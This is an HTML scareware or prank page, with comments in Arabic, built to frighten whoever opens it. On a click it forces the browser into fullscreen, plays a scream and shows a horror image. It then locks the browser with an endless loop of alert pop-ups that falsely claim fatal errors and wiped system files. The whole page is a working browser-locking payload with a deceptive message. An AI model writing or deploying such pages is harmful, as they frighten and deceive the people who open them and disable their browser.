<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SYSTEM_CRITICAL_FAILURE</title>
    <link rel="preload" as="image" href="https://i.ibb.co/39snnynW/1000016067.jpg">
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; font-family: 'Courier New', monospace; text-align: center; color: white; }
        
        /* الصورة المرعبة تملأ الشاشة سواسوة */
        #horrorPayload { 
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
            object-fit: contain; z-index: 10; display: block; 
        }

        /* طبقة الرسالة التحذيرية المخيفة */
        #warningLabel { position: relative; z-index: 100; margin-top: 80vh; color: red; font-size: 18px; text-shadow: 0 0 15px black; font-weight: bold; background: rgba(0,0,0,0.7); padding: 10px; animation: glitch 0.3s infinite; }
        @keyframes glitch { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
    </style>
</head>
<body onclick="launchLockdown()">

    <img id="horrorPayload" src="https://i.ibb.co/39snnynW/1000016067.jpg">
    
    <audio id="sfx" src="https://www.soundboard.com/handler/DownloadTrack.ashx?cliptitle=Scary+Scream&filename=24/243645-77983652-326d-476b-9c71-29402513f56b.mp3"></audio>

    <script>
        // دالة تشغيل الخلعة سواسوة مع ضغطة الضحية
        function launchLockdown() {
            // ملء الشاشة الفوري لإخفاء المتصفح
            document.documentElement.requestFullscreen();
            document.getElementById('sfx').play();
            
            // قفل المتصفح بـ Alert متكرر
            while(true) { alert("⚠️ خطأ قاتل! تم تدمير الملفات الأساسية لنظامك.\nWARNING: FATAL ERROR. CORE_FILES_WIPED_BY_FOUKA.\n> DO NOT EXIT."); }
        }
    </script>
</body>
</html>
